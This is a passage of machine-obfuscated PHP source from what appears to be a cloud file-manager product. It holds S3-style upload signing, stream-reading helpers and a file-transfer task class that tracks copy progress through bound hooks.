array($f¯Ú‹½®¬ğ[1219], $f¯Ú‹½®¬ğ[1220], $f¯Ú‹½®¬ğ[33]), array($f¯Ú‹½®¬ğ[1219], $f¯Ú‹½®¬ğ[1252], $f¯Ú‹½®¬ğ[33]), array($f¯Ú‹½®¬ğ[1219], $f¯Ú‹½®¬ğ[1253], $f¯Ú‹½®¬ğ[33]), array($f¯Ú‹½®¬ğ[1221] => $AÜÜÍÊ±íî), array($f¯Ú‹½®¬ğ[1254] => $A³áß‡ä), array($f¯Ú‹½®¬ğ[1255] => $Dùöá‰‚İœ), array($f¯Ú‹½®¬ğ[1256] => $e¯Øé’§ÙŠ), array($f¯Ú‹½®¬ğ[1257] => $EƒëÜÏ¼îä))); goto C¶ÅÎ×¶¯É; aéËÖ‡Ã³: $DïÑƒ¨ÜÆ = hash_hmac($f¯Ú‹½®¬ğ[1258], $b¯áê™˜Ï, $DÏ†ì„Æ‰, !0); $E´èå‘àãÖ = hash_hmac($f¯Ú‹½®¬ğ[1258], $eÅ©¯¶Ï‹ó, $DïÑƒ¨ÜÆ, !0); $C±–“ß›Ä‚ = hash_hmac($f¯Ú‹½®¬ğ[1258], $fÔìÆñµğÖ, $E´èå‘àãÖ); goto b¿¯„±âäŒ; b¿¯„±âäŒ: $EĞÈİ¢íø‹ = array($f¯Ú‹½®¬ğ[211] => $f¯Ú‹½®¬ğ[33], $f¯Ú‹½®¬ğ[1260] => $f¯Ú‹½®¬ğ[33], $f¯Ú‹½®¬ğ[1217] => $FÕ©Æø³¡», $f¯Ú‹½®¬ğ[1221] => $AÜÜÍÊ±íî, $f¯Ú‹½®¬ğ[1225] => $fÔìÆñµğÖ, $f¯Ú‹½®¬ğ[1261] => $A³áß‡ä, $f¯Ú‹½®¬ğ[1262] => $Dùöá‰‚İœ, $f¯Ú‹½®¬ğ[1263] => $e¯Øé’§ÙŠ, $f¯Ú‹½®¬ğ[1264] => $EƒëÜÏ¼îä, $f¯Ú‹½®¬ğ[1265] => $C±–“ß›Ä‚, $f¯Ú‹½®¬ğ[175] => $this->getHost()); return $EĞÈİ¢íø‹; goto cÛó¸îñ…³; cÛó¸îñ…³: } public function multiUploadFormData($bÉÅá™—À, $fïŸƒˆ•İç = 3600) { $fã™Æ×¬¨ =& $_SERVER[›èö’ù¤]; $Fõù÷‡‘• = gmdate($fã™Æ×¬¨[1342]); $F…œ‚Œ¤ÓÎ = array(); $cÀ‰İ¯à” = $this->client->getUploadId($this->bucket, $bÉÅá™—À, $F…œ‚Œ¤ÓÎ); if (!$cÀ‰İ¯à”) { return !1; } return array($fã™Æ×¬¨[221] => $cÀ‰İ¯à”, $fã™Æ×¬¨[175] => $this->getHost() . $fã™Æ×¬¨[8] . $this->pathEncode($bÉÅá™—À), $fã™Æ×¬¨[222] => $Fõù÷‡‘•, $fã™Æ×¬¨[93] => $bÉÅá™—À); } public function multiUploadAuthData($Bá–ƒ¡’²š, $F‚–òéù±º = array()) { goto fì‘ŞŠ±‡ã; bÓ£ªùõİ¯: unset($F‚–òéù±º[$FŞ„Ÿã‘[93]]); if (isset($F‚–òéù±º[$FŞ„Ÿã‘[223]])) { return $this->listUploadParts($Eòã·ÒäÇ‡, $F‚–òéù±º); } $AÀÎ²¼ëœÅ = array(); goto FˆÊ”ÜˆÆ; dÉĞ›ã¨›: if (strpos($CÌ…—ÄÒÛİ, $FŞ„Ÿã‘[225]) === 0) { if (isset($AÀÎ²¼ëœÅ[$FŞ„Ÿã‘[1344]])) { $d§Ùš»Ø²§ = $AÀÎ²¼ëœÅ[$FŞ„Ÿã‘[1344]]; } else { if (isset($b©äôò‡¶¬[$FŞ„Ÿã‘[1344]])) { $d§Ùš»Ø²§ = $b©äôò‡¶¬[$FŞ„Ÿã‘[1344]]; } else { $d§Ùš»Ø²§ = hash($FŞ„Ÿã‘[1258], $FŞ„Ÿã‘[33]); } } return array($FŞ„Ÿã‘[232] => $b©äôò‡¶¬[$FŞ„Ÿã‘[232]], $FŞ„Ÿã‘[1344] => $d§Ùš»Ø²§, $FŞ„Ÿã‘[222] => $b©äôò‡¶¬[$FŞ„Ÿã‘[1347]]); } return $b©äôò‡¶¬[$FŞ„Ÿã‘[232]]; goto AÉ•£¶Òâ; fì‘ŞŠ±‡ã: $FŞ„Ÿã‘ =& $_SERVER[›èö’ù¤]; $CÌ…—ÄÒÛİ = isset($F‚–òéù±º[$FŞ„Ÿã‘[168]]) ? $F‚–òéù±º[$FŞ„Ÿã‘[168]] : $FŞ„Ÿã‘[33]; $Eòã·ÒäÇ‡ = $F‚–òéù±º[$FŞ„Ÿã‘[93]]; goto bÓ£ªùõİ¯; FˆÊ”ÜˆÆ: if (isset($F‚–òéù±º[$FŞ„Ÿã‘[1343]])) { $AÀÎ²¼ëœÅ[$FŞ„Ÿã‘[1344]] = $F‚–òéù±º[$FŞ„Ÿã‘[1343]]; } $CØ¶‚®Ã¬» = explode($FŞ„Ÿã‘[177], $this->getHost()); $Fòæ£Òíğœ = array($FŞ„Ÿã‘[1345] => $CØ¶‚®Ã¬»[1], $FŞ„Ÿã‘[1346] => $FŞ„Ÿã‘[33], $FŞ„Ÿã‘[211] => $FŞ„Ÿã‘[119], $FŞ„Ÿã‘[1260] => $F‚–òéù±º[$FŞ„Ÿã‘[78]]); goto F˜…²í¼à÷; F˜…²í¼à÷: $EÃÆˆ¡ˆé = $FŞ„Ÿã‘[226]; $AŠŞÒ‹†ˆÛ = $FŞ„Ÿã‘[8] . $this->pathEncode($Eòã·ÒäÇ‡) . $CÌ…—ÄÒÛİ; $b©äôò‡¶¬ = $this->client->__getSignatureV4($AÀÎ²¼ëœÅ, $Fòæ£Òíğœ, $EÃÆˆ¡ˆé, $AŠŞÒ‹†ˆÛ); goto dÉĞ›ã¨›; AÉ•£¶Òâ: } public function listUploadParts($fçéÎ£¨’ê, $AµˆÒçœÕ = array()) { goto E§ß°×“ä; EÎŞ˜Öì¹: $FãÊ¬³¸‹İ = array($FÙ®Ãõ–‹[1345] => $FµËÎİÔó½[1], $FÙ®Ãõ–‹[211] => $FÙ®Ãõ–‹[119], $FÙ®Ãõ–‹[1260] => strlen($CäÕÏ¼§¾›)); $CÊ¼ÚÃ˜‰Ã = $FÙ®Ãõ–‹[224]; $FÄ‰¬ ùêˆ = $FÙ®Ãõ–‹[8] . $this->pathEncode($fçéÎ£¨’ê) . $AµˆÒçœÕ[$FÙ®Ãõ–‹[168]]; goto aĞ›¯–ËÄç; fŒ‹Øô”ö: $CäÕÏ¼§¾› .= $FÙ®Ãõ–‹[1351]; $EÄ’Â·Ñâ† = array(); $FµËÎİÔó½ = explode($FÙ®Ãõ–‹[177], $this->getHost()); goto EÎŞ˜Öì¹; E§ß°×“ä: $FÙ®Ãõ–‹ =& $_SERVER[›èö’ù¤]; $d˜“¾öğŞ¨ = str_replace($FÙ®Ãõ–‹[233], $FÙ®Ãõ–‹[33], $AµˆÒçœÕ[$FÙ®Ãõ–‹[168]]); $E‚®óÄ áá = $this->client->listParts($this->bucket, $fçéÎ£¨’ê, $d˜“¾öğŞ¨); goto d†Üà¦õ³ô; aĞ›¯–ËÄç: $b³Ç¹ôˆéœ = $this->client->__getSignatureV4($EÄ’Â·Ñâ†, $FãÊ¬³¸‹İ, $CÊ¼ÚÃ˜‰Ã, $FÄ‰¬ ùêˆ, $CäÕÏ¼§¾›); return array($FÙ®Ãõ–‹[232] => $b³Ç¹ôˆéœ[$FÙ®Ãõ–‹[232]], $FÙ®Ãõ–‹[222] => $b³Ç¹ôˆéœ[$FÙ®Ãõ–‹[1347]], $FÙ®Ãõ–‹[234] => $E‚®óÄ áá, $FÙ®Ãõ–‹[1344] => $b³Ç¹ôˆéœ[$FÙ®Ãõ–‹[1344]]); goto Dó”¢ å; d†Üà¦õ³ô: if (!$E‚®óÄ áá) { return !1; } $CäÕÏ¼§¾› = $FÙ®Ãõ–‹[1348]; foreach ($E‚®óÄ áá as $a¼Š‹Çíæ”) { $CäÕÏ¼§¾› .= $FÙ®Ãõ–‹[1349] . "\74\x50\141\162\x74\x4e\165\x6d\x62\x65\162\76{$a¼Š‹Çíæ”[$FÙ®Ãõ–‹[1305]]}\x3c\57\x50\141\x72\164\116\165\x6d\x62\x65\162\76\xa" . "\x3c\x45\124\141\x67\x3e{$a¼Š‹Çíæ”[$FÙ®Ãõ–‹[1306]]}\74\57\105\124\x61\x67\76\12" . $FÙ®Ãõ–‹[1350]; } goto fŒ‹Øô”ö; Dó”¢ å: } public function link($c¥ä±·»¾®, $BöÁÛïàÓÑ = array()) { return parent::link($c¥ä±·»¾®, $BöÁÛïàÓÑ); } public function fileOut($bê¹ƒõíÜÚ, $Bî‹óœíÑ‚ = false, $c¾Òİæé‘Ö = false, $bÃÑ˜ªÓ‡¦ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[›èö’ù¤][1352])) { return parent::fileOutServer($bê¹ƒõíÜÚ, $Bî‹óœíÑ‚, $c¾Òİæé‘Ö, $bÃÑ˜ªÓ‡¦); } parent::fileOut($bê¹ƒõíÜÚ, $Bî‹óœíÑ‚, $c¾Òİæé‘Ö, $bÃÑ˜ªÓ‡¦); } public function fileOutImage($a­²ƒïœª–, $eïÕÕ˜Ù²ê = 250) { if (strstr($this->endpoint, $_SERVER[›èö’ù¤][1352])) { return parent::fileOutImageServer($a­²ƒïœª–, $eïÕÕ˜Ù²ê); } parent::fileOutImage($a­²ƒïœª–, $eïÕÕ˜Ù²ê); } public function fileOutLink($cÛÉßÑ»Ì³) { $DŸä“ƒÆÜï =& $_SERVER[›èö’ù¤]; if (substr($cÛÉßÑ»Ì³, 0, 7) == $DŸä“ƒÆÜï[1228]) { $cÛÉßÑ»Ì³ = $DŸä“ƒÆÜï[1229] . substr($cÛÉßÑ»Ì³, 7); } header($DŸä“ƒÆÜï[159] . $cÛÉßÑ»Ì³); die; } public function getHost() { $e¬Â­„“¯Ô =& $_SERVER[›èö’ù¤]; $B£ÏĞÜ¦Òâ = str_rtrim(parent::getHost(), $e¬Â­„“¯Ô[8] . $this->bucket); $B£ÏĞÜ¦Òâ = explode($e¬Â­„“¯Ô[177], $B£ÏĞÜ¦Òâ); return $B£ÏĞÜ¦Òâ[0] . $e¬Â­„“¯Ô[177] . $this->bucket . $e¬Â­„“¯Ô[95] . $B£ÏĞÜ¦Òâ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($B—Ø†‹‹ï, $d›ÏŒÕğÒã = 0) { parent::__construct(); $this->source = $B—Ø†‹‹ï; $this->sourceSize = $d›ÏŒÕğÒã; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($C”Ô¾¨¤ÆÆ = false) { return $this->sourceSize; } public function getContent($c™éò£–á¦ = false) { return $this->fileSubstr($c™éò£–á¦, 0, $this->sourceSize); } public function fileSubstr($AˆÈ«ËŸ‘Æ = false, $Dò¹ˆàÕÄ× = 0, $cœØ™‡Êøì = 0) { if (!$cœØ™‡Êøì) { $cœØ™‡Êøì = $this->sourceSize; } $Fâó­Ò„¥é = $this->sourceSize - $Dò¹ˆàÕÄ×; if ($cœØ™‡Êøì >= $Fâó­Ò„¥é) { $cœØ™‡Êøì = $Fâó­Ò„¥é; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Dò¹ˆàÕÄ×, $cœØ™‡Êøì); } if ($this->sourceType == self::TYPE_FILE) { if ($cœØ™‡Êøì <= 0) { return $_SERVER[›èö’ù¤][33]; } $F“¼ñæÏ‹ä = ftell($this->source); fseek_64($this->source, $F“¼ñæÏ‹ä + $Dò¹ˆàÕÄ×); $c‡ŒÖ¢ŸÇ = @fread($this->source, $cœØ™‡Êøì); fseek_64($this->source, $F“¼ñæÏ‹ä); return $c‡ŒÖ¢ŸÇ; } } public function hashMd5($e¼ÜÅÏİŒ = false) { return md5($this->getContent()); } public static function hash($c‘”ÃĞ’¶÷, $cø”ƒĞ¯¦ = 0) { $aóÈ¸»Ÿï = new PathDriverStream($c‘”ÃĞ’¶÷, $cø”ƒĞ¯¦); return $aóÈ¸»Ÿï->hashSimple($c‘”ÃĞ’¶÷); } public static function md5($dä‹¬¼‰¸, $d ğÅÙ™› = 0) { $Aƒ´Ş®í¾ = new PathDriverStream($dä‹¬¼‰¸, $d ğÅÙ™›); return $Aƒ´Ş®í¾->hashMd5($dä‹¬¼‰¸); } } goto fŒæ‚î¶±Î; aéÅ³™¸Ì: class TaskFileTransfer extends Task { protected function startAfter() { goto cÌøÍƒğ; a¿å„÷Ø¬¬: Hook::bind($CÕŞÔ„Î¾¾[1589], array($this, $CÕŞÔ„Î¾¾[1590])); Hook::bind($CÕŞÔ„Î¾¾[1591], array($this, $CÕŞÔ„Î¾¾[1592])); Hook::bind($CÕŞÔ„Î¾¾[1593], array($this, $CÕŞÔ„Î¾¾[1594])); goto F«Ó´²÷Ñˆ; cÌøÍƒğ: $CÕŞÔ„Î¾¾ =& $_SERVER[›èö’ù¤]; $DÍÇ‘î¸é¼ =& $this->task; $this->sourceCopyFolder = !1; goto fóêÃ¡¡óË; dÀè ¬Œöİ: Hook::bind($CÕŞÔ„Î¾¾[1586], array($this, $CÕŞÔ„Î¾¾[1587])); Hook::bind($CÕŞÔ„Î¾¾[586], array($this, $CÕŞÔ„Î¾¾[1588])); $this->sourceModelCopyFlag = !1; goto a¿å„÷Ø¬¬; f®’ Ø”è: $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1048]] = $CÕŞÔ„Î¾¾[33]; $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1599]] = $CÕŞÔ„Î¾¾[33]; $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1600]] = 0; goto Dîù˜¾ïÈ; aÑÖ—àîÙà: Hook::bind($CÕŞÔ„Î¾¾[593], array($this, $CÕŞÔ„Î¾¾[1582])); Hook::bind($CÕŞÔ„Î¾¾[594], array($this, $CÕŞÔ„Î¾¾[1583])); Hook::bind($CÕŞÔ„Î¾¾[596], array($this, $CÕŞÔ„Î¾¾[1584])); goto C„¼ÈÚ†É¶; dÀÔèåöÓâ: Hook::bind($CÕŞÔ„Î¾¾[565], array($this, $CÕŞÔ„Î¾¾[1585])); Hook::bind($CÕŞÔ„Î¾¾[567], array($this, $CÕŞÔ„Î¾¾[1585])); Hook::bind($CÕŞÔ„Î¾¾[569], array($this, $CÕŞÔ„Î¾¾[1585])); goto dÀè ¬Œöİ; C„¼ÈÚ†É¶: Hook::bind($CÕŞÔ„Î¾¾[597], array($this, $CÕŞÔ„Î¾¾[1584])); Hook::bind($CÕŞÔ„Î¾¾[563], array($this, $CÕŞÔ„Î¾¾[1585])); Hook::bind($CÕŞÔ„Î¾¾[560], array($this, $CÕŞÔ„Î¾¾[1585])); goto dÀÔèåöÓâ; Dîù˜¾ïÈ: $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1601]] = 0; $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1602]] = 0; if (!$DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1454]]) { $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1454]] = LNG($CÕŞÔ„Î¾¾[1603]); } goto EêÑƒ„à¿; F«Ó´²÷Ñˆ: $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1595]] = LNG($CÕŞÔ„Î¾¾[1596]); $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1597]] = 0; $DÍÇ‘î¸é¼[$CÕŞÔ„Î¾¾[1598]] = 0; goto f®’ Ø”è; fóêÃ¡¡óË: Hook::bind($CÕŞÔ„Î¾¾[1577], array($this, $CÕŞÔ„Î¾¾[1578])); Hook::bind($CÕŞÔ„Î¾¾[1134], array($this, $CÕŞÔ„Î¾¾[1579])); Hook::bind($CÕŞÔ„Î¾¾[1580], array($this, $CÕŞÔ„Î¾¾[1581])); goto aÑÖ—àîÙà; EêÑƒ„à¿: } protected function endAfter() { goto cƒ·‘Û’; FŠ´¶Â°: Hook::unbind($fµö·³óÑ[1589], array($this, $fµö·³óÑ[1590])); Hook::unbind($fµö·³óÑ[1591], array($this, $fµö·³óÑ[1592])); Hook::unbind($fµö·³óÑ[1593], array($this, $fµö·³óÑ[1594])); goto dªÑÄœÙÃ; a‹‹Úª³Ûİ: Hook::unbind($fµö·³óÑ[569], array($this, $fµö·³óÑ[1585])); Hook::unbind($fµö·³óÑ[1586], array($this, $fµö·³óÑ[1587])); Hook::unbind($fµö·³óÑ[586], array($this, $fµö·³óÑ[1588])); goto FŠ´¶Â°; FÏÚšëùÊğ: Hook::unbind($fµö·³óÑ[596], array($this, $fµö·³óÑ[1584])); Hook::unbind($fµö·³óÑ[597], array($this, $fµö·³óÑ[1584])); Hook::unbind($fµö·³óÑ[563], array($this, $fµö·³óÑ[1585])); goto e¥ñİî÷…; a†“Ÿ×á†²: Hook::unbind($fµö·³óÑ[1580], array($this, $fµö·³óÑ[1581])); Hook::unbind($fµö·³óÑ[593], array($this, $fµö·³óÑ[1582])); Hook::unbind($fµö·³óÑ[594], array($this, $fµö·³óÑ[1583])); goto FÏÚšëùÊğ; cƒ·‘Û’: $fµö·³óÑ =& $_SERVER[›èö’ù¤]; Hook::unbind($fµö·³óÑ[1577], array($this, $fµö·³óÑ[1578])); Hook::unbind($fµö·³óÑ[1134], array($this, $fµö·³óÑ[1579])); goto a†“Ÿ×á†²; e¥ñİî÷…: Hook::unbind($fµö·³óÑ[560], array($this, $fµö·³óÑ[1585])); Hook::unbind($fµö·³óÑ[565], array($this, $fµö·³óÑ[1585])); Hook::unbind($fµö·³óÑ[567], array($this, $fµö·³óÑ[1585])); goto a‹‹Úª³Ûİ; dªÑÄœÙÃ: } public function copyMoveStart($bá†°Œƒ¨ï, $Eôšê‚‚ò®, $fœÖ¸àïô, $f¡ÑÀ™Ê·ä) { goto e¡ÏéãÕÉ; aÑ‰¬Š ŞØ: $fãÁéŸšË[$aïõñ­âìÒ[1605]] = KodIO::transferType($bá†°Œƒ¨ï, $fœÖ¸àïô); $this->update(); goto aß¤‹‘‚‚; Cèè¡´ÜŠç: if (substr($Eôšê‚‚ò®, 0, strlen($eµŒæóÇ¯›)) == $eµŒæóÇ¯›) { return; } if (substr($f¡ÑÀ™Ê·ä, 0, strlen($eµŒæóÇ¯›)) == $eµŒæóÇ¯›) { return; } $fãÁéŸšË =& $this->task; goto aÑ‰¬Š ŞØ; e¡ÏéãÕÉ: $aïõñ­âìÒ =& $_SERVER[›èö’ù¤]; self::log($aïõñ­âìÒ[1604] . $Eôšê‚‚ò® . $aïõñ­âìÒ[67] . $f¡ÑÀ™Ê·ä); $eµŒæóÇ¯› = rtrim(TEMP_FILES, $aïõñ­âìÒ[8]); goto Cèè¡´ÜŠç; aß¤‹‘‚‚: } public function updateAfter() { $Bì¡®½Óô½ =& $_SERVER[›èö’ù¤]; $Bğ‰¢‚È†Ò =& $this->task; if (!$Bğ‰¢‚È†Ò[$Bì¡®½Óô½[747]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Bğ‰¢‚È†Ò[$Bì¡®½Óô½[1605]] == $Bì¡®½Óô½[1207]) { return; } self::updateTask($Bğ‰¢‚È†Ò); } private static function updateTask(&$FŸÜ„¨˜ˆ) { $fô’ÓÀïÓ =& $_SERVER[›èö’ù¤]; if ($FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1605]] == $fô’ÓÀïÓ[1118] || $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1605]] == $fô’ÓÀïÓ[107]) { if ($FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1599]]) { $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1602]] = $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1601]] + $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1598]]; } } else { if ($FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1605]] == $fô’ÓÀïÓ[1208]) { if ($FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1599]] == $fô’ÓÀïÓ[1118]) { $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1602]] = $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1601]] + $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1598]] * 0.5; } else { if ($FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1599]] == $fô’ÓÀïÓ[107]) { $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1602]] = $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1601]] + $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1597]] * 0.5 + $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1598]] * 0.5; } } } } $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1552]] = $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1602]] / $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[747]]; if ($FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1552]] > 0) { $EäĞºÓø‹¾ = timeFloat() - $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[773]] - $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1555]]; $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1556]] = $EäĞºÓø‹¾ * (1 - $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1552]]) / $FŸÜ„¨˜ˆ[$fô’ÓÀïÓ[1552]]; } } public function addPath($f”…¯ã’«¥) { goto Aë‡¸œ¢¥; Aë‡¸œ¢¥: $dÕï‡Äó¹ª =& $_SERVER[›èö’ù¤]; if (!$f”…¯ã’«¥) { return; } $D¸ïçÛ¡Î× =& $this->task; goto B‰èÈ¦Ã‚ï; B‰èÈ¦Ã‚ï: $Aˆ…’ÇÁÅÍ = IO::infoWithChildren($f”…¯ã’«¥); $e˜‡»õ×«š = $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[1606]] ? $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[1606]][$dÕï‡Äó¹ª[1607]] : 0; $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[1606]] = array($dÕï‡Äó¹ª[1607] => $e˜‡»õ×«š + 1, $dÕï‡Äó¹ª[415] => $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[28]], $dÕï‡Äó¹ª[76] => $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[76]], $dÕï‡Äó¹ª[514] => $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[514]] ? $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[514]] : $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[76]]); goto d¹¬°œ„†; d¹¬°œ„†: if ($Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[29]] == $dÕï‡Äó¹ª[193]) { $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[1046]] += 1; } else { $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[1046]] += $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[81]][$dÕï‡Äó¹ª[79]]; if ($Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[397]]) { $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[1046]] += $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[81]][$dÕï‡Äó¹ª[80]] + 1; } } $D¸ïçÛ¡Î×[$dÕï‡Äó¹ª[747]] += $Aˆ…’ÇÁÅÍ[$dÕï‡Äó¹ª[78]]; $this->update(); goto c°¼‹¾äóç; c°¼‹¾äóç: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($D‹‡ø¬›à) { $e†¿ˆßÃ¦ =& $_SERVER[›èö’ù¤]; $fø‡½ŒÚ†‘ =& $this->task; $fø‡½ŒÚ†‘[$e†¿ˆßÃ¦[1595]] = $D‹‡ø¬›à[$e†¿ˆßÃ¦[28]]; $fø‡½ŒÚ†‘[$e†¿ˆßÃ¦[1048]] = $D‹‡ø¬›à[$e†¿ˆßÃ¦[28]]; $this->update(); } public function copyFileStart($bÅ³¯ÍìÚ—, $B¡‚³Ÿë½Ç, $d²ÆÇóÒò, $A…äùÎÇ“, $DÆÂ»±À¡†, $B É•Š­à°) { goto C¡ÁìªìÍğ; C¡ÁìªìÍğ: $d†Òî‹Šî =& $_SERVER[›èö’ù¤]; $Bß¼‹°‰‰ = $DÆÂ»±À¡†; if ($Bß¼‹°‰‰ == $GLOBALS[$d†Òî‹Šî[1608]]) { $Bß¼‹°‰‰ = $GLOBALS[$d†Òî‹Šî[1609]]; } goto Cé§Ãô†Š«; A—¬øåŠÄ÷: $e½øˆÔ–ˆ = $BËé›…õ‰ô[$d†Òî‹Šî[1597]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($BËé›…õ‰ô[$d†Òî‹Šî[395]] . $d†Òî‹Šî[1610]); if ($e½øˆÔ–ˆ && file_exists(get_path_father($A…äùÎÇ“))) { Cache::set($BËé›…õ‰ô[$d†Òî‹Šî[395]] . $d†Òî‹Šî[1610], $A…äùÎÇ“); $BËé›…õ‰ô[$d†Òî‹Šî[1570]] = array($d†Òî‹Šî[1611], $d†Òî‹Šî[1612]); } goto bÃ‹î¾ÀÇ¦; dÓ¶—¯ï’: $BËé›…õ‰ô[$d†Òî‹Šî[1048]] = $d†Òî‹Šî[33]; $BËé›…õ‰ô[$d†Òî‹Šî[1599]] = $d†Òî‹Šî[33]; $BËé›…õ‰ô[$d†Òî‹Šî[1600]] = 0; goto A—¬øåŠÄ÷; bÃ‹î¾ÀÇ¦: $this->update(0, $e½øˆÔ–ˆ); goto aåÍª¾¿Û‘; cà‘†ì¯öğ: $BËé›…õ‰ô[$d†Òî‹Šî[1595]] = $Bß¼‹°‰‰; $BËé›…õ‰ô[$d†Òî‹Šî[1597]] = (int) $bÅ³¯ÍìÚ—->size($B¡‚³Ÿë½Ç); $BËé›…õ‰ô[$d†Òî‹Šî[1598]] = 0; goto dÓ¶—¯ï’; Cé§Ãô†Š«: $GLOBALS[$d†Òî‹Šî[1609]] = $DÆÂ»±À¡†; $GLOBALS[$d†Òî‹Šî[1608]] = $B É•Š­à°; $BËé›…õ‰ô =& $this->task; goto cà‘†ì¯öğ; aåÍª¾¿Û‘: } public static function updateCopyLocalFileSize($Fì‹àœ³ßÏ) { goto b¦ŠßÇÛò; f¹¯±Í„İÔ: return $Fì‹àœ³ßÏ; goto aÖ÷ë‚Ûö; Eõ“ñâÚ×: $Fì‹àœ³ßÏ[$B¡ÌÆÔ“èå[1598]] = @filesize($Aº†ªç’‹Œ); $Fì‹àœ³ßÏ[$B¡ÌÆÔ“èå[1602]] += $Fì‹àœ³ßÏ[$B¡ÌÆÔ“èå[1598]]; self::updateTask($Fì‹àœ³ßÏ); goto f¹¯±Í„İÔ; b¦ŠßÇÛò: $B¡ÌÆÔ“èå =& $_SERVER[›èö’ù¤]; $Aº†ªç’‹Œ = Cache::get($Fì‹àœ³ßÏ[$B¡ÌÆÔ“èå[395]] . $B¡ÌÆÔ“èå[1610]); if (!$Aº†ªç’‹Œ || !file_exists($Aº†ªç’‹Œ)) { return $Fì‹àœ³ßÏ; } goto Eõ“ñâÚ×; aÖ÷ë‚Ûö: } public function copyFileEnd($f©«©´ÔŞæ, $b›Ã¨ÒÀòÚ, $bÏßŞ‘İ¦‹, $E¶ô–©ÒÚ, $dé×ô›±°Ø, $c²ù¯½„ìÍ) { goto cåÆÇØ±¾; cåÆÇØ±¾: $c²¿ƒ¡‚ìè =& $_SERVER[›èö’ù¤]; $BÚ¯Û¯”ö¶ =& $this->task; $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1598]] = $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1597]]; goto AÄéÌ¿‘Öê; AÄéÌ¿‘Öê: $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1599]] = $c²¿ƒ¡‚ìè[33]; unset($BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1570]]); if ($dé×ô›±°Ø == $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1595]]) { $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1601]] += $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1597]]; $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1602]] = $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1601]]; $this->update(1); } else { $this->update(); $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1598]] = 0; } goto fÖ¢µ‹°çš; fÖ¢µ‹°çš: Cache::remove($BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[395]] . $c²¿ƒ¡‚ìè[1610]); self::log($c²¿ƒ¡‚ìè[1613] . $b›Ã¨ÒÀòÚ . $c²¿ƒ¡‚ìè[67] . $E¶ô–©ÒÚ . $c²¿ƒ¡‚ìè[229] . $dé×ô›±°Ø . $c²¿ƒ¡‚ìè[1614] . $BÚ¯Û¯”ö¶[$c²¿ƒ¡‚ìè[1595]]); goto D‚Í”ï´è; D‚Í”ï´è: } public function updateFileEnd($eÏöÂºïÑ¼, $FØ¨äØóŒ) { goto dã°íçÛí; BİŒŒéÏ³›: $this->update(1); self::log($dêâ®ó¥õ¹[1615] . $eÏöÂºïÑ¼); goto AÍÍÍĞ›­; bÄÌ™ÁÖ‚œ: $eŒ›ç³çÛÜ[$dêâ®ó¥õ¹[1597]] = 